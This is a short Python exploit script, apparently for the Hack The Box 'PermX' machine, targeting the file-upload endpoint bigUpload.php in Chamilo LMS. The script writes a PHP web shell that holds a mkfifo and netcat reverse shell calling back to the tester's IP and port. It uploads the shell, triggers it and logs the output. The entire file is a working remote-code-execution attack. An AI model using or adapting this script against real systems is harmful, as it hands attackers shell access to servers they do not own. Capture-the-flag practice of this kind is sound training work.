import requests

your_ip = '10.10.16.12'
port = 9000

params = {
    'action': 'post-unsupported',
}

files = {
    'bigUploadFile': open('permx/rce.php', 'rb'),
}


cmd = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {your_ip} {port} >/tmp/f'
with open('permx/rce.php','w') as f:
    f.write(f'<?php system("{cmd}"); ?>')

response = requests.post('http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php', params=params, files=files)

response = requests.get('http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php')
print(response.text)

with open('permx/output.txt','a') as f:
    f.write(f' --- Output of: {cmd} ---\n')
    f.write(f'{response.text}\n')